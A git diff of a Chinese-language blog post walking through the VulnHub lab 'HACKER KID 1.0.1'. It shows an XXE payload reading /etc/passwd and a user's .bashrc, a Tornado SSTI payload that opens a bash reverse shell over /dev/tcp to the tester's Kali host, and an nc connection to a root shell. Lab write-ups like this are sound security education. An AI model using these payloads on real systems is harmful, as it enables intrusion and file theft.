@@ -193,7 +193,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"CSRF","path":"2025/08/24/CSRF/"},{"title":"LazySysAdmin靶场渗透","path":"2025/10/13/LazySysAdmin靶场渗透/"},{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"},{"title":"XSS","path":"2025/08/23/XSS/"},{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"XXE","path":"2025/08/16/XXE/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"pop","path":"2025/07/07/pop/"},{"title":"vulnhub靶场HACKER KID:1.0.1","path":"2025/10/31/vulnhub靶场HACKER-KID-1-0-1/"},{"title":"渗透测试值工具kali","path":"2025/10/26/渗透测试工具kali/"}]`)
+  const posts = JSON.parse(`[{"title":"CSRF","path":"2025/08/24/CSRF/"},{"title":"1zweb","path":"2025/07/09/1zweb/"},{"title":"XSS","path":"2025/08/23/XSS/"},{"title":"SSRF漏洞","path":"2025/08/14/SSRF漏洞/"},{"title":"LazySysAdmin靶场渗透","path":"2025/10/13/LazySysAdmin靶场渗透/"},{"title":"babyserialize","path":"2025/07/07/babyserialize/"},{"title":"level-up","path":"2025/07/07/level-up/"},{"title":"pop","path":"2025/07/07/pop/"},{"title":"vulnhub靶场HACKER KID:1.0.1","path":"2025/10/31/vulnhub靶场HACKER-KID-1-0-1/"},{"title":"渗透测试值工具kali","path":"2025/10/26/渗透测试工具kali/"},{"title":"XXE","path":"2025/08/16/XXE/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -335,7 +335,7 @@
       </p>
       <p class="main-left--subtitle">
         <span>上线时间：</span>
-        <span>155天</span>
+        <span>164天</span>
       </p>
       <p class="main-left--subtitle">
         <span>当前版本：</span>
@@ -392,6 +392,7 @@
 
 <p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/image-20251029230836993-17617505182672.png" alt="image-20251029230836993"></p>
 <p>我们看到开放的端口有53，80，9999，53是dns的服务端口，80是http服务默认端口</p>
+<p>9999端口开放的同时，还识别出这个端口上运行的服务（http）对应的服务器是tornado（一个python的web框架）</p>
 <h4 id="收集页面信息"><a href="#收集页面信息" class="headerlink" title="收集页面信息"></a>收集页面信息</h4><p>从最常见的80端口入手</p>
 <p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/010d9f07ff7270331a61b7de257c54e3.png" alt="img"></p>
 <p>这个页面表面上看是没啥提示的，但是他说你越深挖我，就越能在你的服务器上找到我……继续挖我……继续挖我。</p>
@@ -448,13 +449,19 @@
 <p>测试一下看看有没有回显位，根据我们刚刚提交的信息得到的回应最有可能回显位就是email处，这里验证一下</p>
 <p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/44cd0da81c6d9888e04e72d7e8c2ce75.png" alt="img"></p>
 <p>测处email处就是回显位</p>
-<p>既然真的存在xxe漏洞，那我们就利用它去读取一下我们本地敏感文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">  &lt;!ENTITY xxe &quot;test123&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有回显，说明实体解析已经开启，很大可能存在xxe漏洞</p>
+<p>可能存在xxe漏洞，那我们就利用它去读取一下我们本地敏感文件，看看能不能读取</p>
 <p>构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ZY [</span><br><span class="line">        &lt;!ENTITY ddd SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        &amp;ddd;</span><br></pre></td></tr></table></figure>
 
+
+
 <p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/6f5dc96b5d98b2be5dc84109e2c79769.png" alt="img"></p>
+<p>发现真的能读取本地敏感文件（能看到所有用户账户），是一个货真价实的回显型xxe漏洞</p>
 <p>我们用payload读取了靶机的全部用户，发现除了root用户，还有一个用户saket也有登录bash的权限，在众多用户都没有登录权限的时候，saket用户有，他直接脱颖而出，那必须得好好利用一下</p>
-<p>查看他的.bashrc文件看看里面是否有能利用的信息</p>
+<p>查看他的.bashrc文件（渗透测试中的宝藏文件）看看里面是否有能利用的信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bashrc 就是 每次打开新 bash 终端时自动执行的“个人启动脚本”，里面通常是环境变量 + 别名 + 函数 + 提示符美化，偶尔夹带密码/后门/横向移动线索。</span><br><span class="line">Bash 就是 Linux 的‘命令行操作系统’；谁有 /bin/bash，谁就能开终端、跑脚本、留后门</span><br></pre></td></tr></table></figure>
 
 <p>尝试读取saket的.bashrc（这个文件一般在用户的家目录下&#x2F;home&#x2F;saket&#x2F;.bashrc）</p>
@@ -472,16 +479,21 @@
 <p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/723241dcd64b8cc605b212696d2f497d.png" alt="img"></p>
 <p>页面提示，让我们告诉它名字，那就想到get传参</p>
 <p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/35953e8f9f2dd8b884fbefb246ba7bf5.png" alt="img"></p>
-<h5 id="SSTI模板注入-反弹shell"><a href="#SSTI模板注入-反弹shell" class="headerlink" title="SSTI模板注入+反弹shell"></a>SSTI模板注入+反弹shell</h5><p>结合前面<code>nmap</code>扫描扫出来的信息知道这是一个基于tornado框架的web服务器，并且前面已经测试过了有get传参，敏感一点，看看是否有ssti模板注入漏洞</p>
+<h5 id="SSTI模板注入-反弹shell"><a href="#SSTI模板注入-反弹shell" class="headerlink" title="SSTI模板注入+反弹shell"></a>SSTI模板注入+反弹shell</h5><p>结合前面<code>nmap</code>扫描扫出来的信息知道这个9999端口上运行的服务的对应的服务器是tornado框架的，并且前面已经测试过了有get传参</p>
+<p>在 GET 参数回显场景下， Tornado 框架最需警惕的是服务端模板注入 (SSTI)。</p>
+<p>Tornado 使用自己的模板引擎。</p>
 <p>测试一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/badf539749d57090c480130e2281281e.png" alt="img"></p>
 <p>执行了，确认存在ssti模板注入漏洞</p>
+<p>原因：</p>
+<p>模板引擎的工作应该是填空：<br>你叫   →  把 name 的值填进来<br>但如果它能算数：<br>你叫 49  →  算出 49 再填进来<br>这就说明：用户输入的代码被服务器执行了。</p>
 <p>那我们利用ssti来进行反弹shell</p>
 <p><strong>利用ssti模板注入漏洞进行反弹shell的原因</strong></p>
 <p>因为我们暂时只拿到了saket这个用户的用户名，我们并不知道用户密码，无法直接在靶机登录该普通用户拿到低权shell然后再通过其他方法达到提权的目的，所以我们利用反弹shell，直接将该用户能拿到的低权shell直接弹到kali上，不仅躲避了密码登录的麻烦，后续继续进行渗透也更加方便</p>
 <p>构造payload</p>
+<p>tornado框架自带一个os命令执行模块，所以直接将os模块导入利用即可</p>
 <p>导入<code>os</code>模块执行命令（反弹shell的命令）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.240.99/6677 0&gt;&amp;1&quot;&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -635,7 +647,7 @@
 <p><code>nc 192.168.240.130 5600</code>，我们直接连接</p>
 <p><img src="/2025/10/31/vulnhub%E9%9D%B6%E5%9C%BAHACKER-KID-1-0-1/87fdb6bca24ae054186e957c263c1be3.png" alt="img"></p>
 <p>成功提权</p>
-<p>**注入完成 → 靶机开放 5600 且已 root → Kali 连 5600 → 提权成功。</p>
+<p><strong>注入完成 → 靶机开放 5600 且已 root → Kali 连 5600 → 提权成功。</strong></p>
 
     </article>
     
